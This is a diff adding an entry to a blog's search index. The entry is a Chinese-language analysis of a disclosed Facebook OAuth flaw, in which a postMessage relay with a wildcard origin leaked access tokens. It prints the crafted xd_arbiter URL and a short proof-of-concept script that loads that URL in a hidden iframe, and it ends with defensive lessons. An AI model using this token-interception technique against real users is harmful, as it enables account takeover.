@@ -4,6 +4,39 @@
   
   
   <entry>
+    <title>API漏洞 【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01</title>
+    <link href="/2023/11/09/API%E6%BC%8F%E6%B4%9E-facebook-OAuth/"/>
+    <url>/2023/11/09/API%E6%BC%8F%E6%B4%9E-facebook-OAuth/</url>
+    
+    <content type="html"><![CDATA[<h1 id="【API安全漏洞剖析】-FaceBook-OAuth-漏洞-2020-03-01"><a href="#【API安全漏洞剖析】-FaceBook-OAuth-漏洞-2020-03-01" class="headerlink" title="【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01"></a>【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01</h1><p>信息来源: <a href="https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/">https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/</a></p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>第三方网站如(Instagram)是可以通过 Facebook 账号进行登录的, 具体登录逻辑就是利用 Facebook 提供的 SDK,使用 OAuth 授权进行登录。</p><p>具体来说就是用户登录 ins, 然后 ins 会根据 FaceBook 的 SDK 规范, 跳转到 Facebook 对应的登录页面, Facebook 登录完成之后, 返回一个 access_token 给 ins, 完成登录。</p><p>黑客在这个 OAuth 授权流程能够<strong>窃取 access_token</strong> ,从而达到接管用户账号的目的。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p> 在 Facebook 提供给开发者接入的 SDK 中, 有一个名为 “&#x2F;connect&#x2F;ping” 的登录服务端, 它是提供给第三方应用获取用户访问令牌的第三方端点, 具体逻辑是开发者通过编码在后台创建跨域通信的代理 <code>iframe</code> , 再使用 <code>window.postMessage()</code> 方法接收令牌, 在接收令牌后, 该 API 会把链接跳转指向 Facebook 的 “XD_Arbiter” 下。 完整的 URL 为(以 ins 为例):</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.facebook.com/connect/ping?client_id=APP_ID&amp;redirect_uri=https://staticxx.facebook.com/connect/xd_arbiter.php?version=42#origin=https://www.instagram.com<br></code></pre></td></tr></table></figure><p> 这里的 <code>APP_ID</code> 是第三方应用在 Facebook 注册时生成的应用 ID 值。</p><p> 攻击者发现这里的 <code>xd_arbiter.php?version=42</code> 可以被<strong>篡改</strong>成 <code>xd_arbiter/?version=42</code> , 然后在此基础下, 能够将目录附加到后面实现资源访问。</p><p>在这里由于通过上述目录获取到的 <code>access_token</code> 的相关值都是哈希片段, 很难去还原, 但是攻击者在 <code>page_proxy</code> 目录中发现了一个名为 <code>7SWBAvHenEn.js</code> 的 js 文件, 这个文件中包含如下内容:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> frameName = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;#&quot;</span>)[<span class="hljs-number">1</span>];<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">parent</span>.<span class="hljs-title function_">postMessage</span>(frameName,<span class="hljs-string">&quot;*&quot;</span>);<br></code></pre></td></tr></table></figure><p>第一行代码会获取 URL 请求参数中 <code>#</code> 后面的内容, 将它赋值给 <code>frameName</code> , 然后调用 <code>window.parent.postMessage</code> 转发来自 <code>frameName</code> 发送的内容, 这里的 <code>*</code> 代表他可以接收任意源的请求。</p><p>然后攻击者构造 URL 为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://staticxx.facebook.com/connect/xd_arbiter/r/7SWBAvHenEn.js?version=42<br></code></pre></td></tr></table></figure><p>就可以穿越访问到这个文件, 再通过 <code>#</code> 去指定源, 就可以拦截该源发送回来的 <code>access_token</code> .</p><p>这个 js 文件能够被攻击者利用, 原因如下:</p><ol><li>攻击者能够通过资源附加访问到这个文件.</li><li><code>postMessage()</code> 方法会发送未加密的令牌.</li><li><code>*</code> 允许了攻击者能在自己的源 ip 下请求并获取响应.</li><li>API 请求中没有验证 <code>X-Frame-Options</code> 标题,导致能够在 <code>xd_arbiter</code> 中嵌入跨域嵌套 <code>postMessage()</code> 回显的窗口.</li><li><code>window.parent</code> 下的方法不用与用户交互, 不需要关心<code>window.open</code>或任何<code>onClick</code>事件.</li></ol><h2 id="漏洞劫持"><a href="#漏洞劫持" class="headerlink" title="漏洞劫持"></a>漏洞劫持</h2><p>最后攻击者重写 <code>Custom_SDK.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> app_id = <span class="hljs-string">&#x27;124024574287414&#x27;</span>,<br>app_domain = <span class="hljs-string">&#x27;www.instagram.com&#x27;</span>;<br><br><span class="hljs-keyword">var</span> exploit_url = <span class="hljs-string">&#x27;https://www.facebook.com/connect/ping?client_id=&#x27;</span> + app_id + <span class="hljs-string">&#x27;&amp;redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2F7SWBAvHenEn.js%3Fversion%3D44%23origin%3Dhttps%253A%252F%252F&#x27;</span> + app_domain;<br><br><span class="hljs-keyword">var</span> i = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>);<br>i.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>);<br>i.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;style&#x27;</span>, <span class="hljs-string">&#x27;display:none;&#x27;</span>);<br>i.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;src&#x27;</span>, exploit_url);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(i);<br><br><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;OAuth&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">FB</span>) &#123;<br>  <span class="hljs-title function_">alert</span>(<span class="hljs-variable constant_">FB</span>.<span class="hljs-property">data</span>.<span class="hljs-property">name</span>);<br>&#125;, !<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>实现跨域攻击, 接管账户.</p><h2 id="启示"><a href="#启示" class="headerlink" title="启示"></a>启示</h2><p>作为防守方, 仅仅使用 URL 白名单来防御是不够的, 在面对跨域通信, 不同设备甚至浏览器的情况下, 即使使用了 <code>X-Frame-Options</code> 来防止跨域请求, 也有可能会因为兼容性问题产生漏洞.</p><p>在这里的启示就是, 应用设计时, 在实现功能的前提下, 要尽可能遵循简单原则, 参考标准协议实现流程, <strong>线上环境不使用的文件, 要尽快清除</strong>.</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>API安全</category>
+      
+      <category>漏洞剖析</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>API 安全</tag>
+      
+      <tag>OAuth</tag>
+      
+      <tag>跨域劫持</tag>
+      
+      <tag>CSRF</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>【NewStarCTF2023】Unserialize Again phar 文件反序列化</title>
     <link href="/2023/11/08/NewStarCTF2023-Unserialize-Again/"/>
     <url>/2023/11/08/NewStarCTF2023-Unserialize-Again/</url>
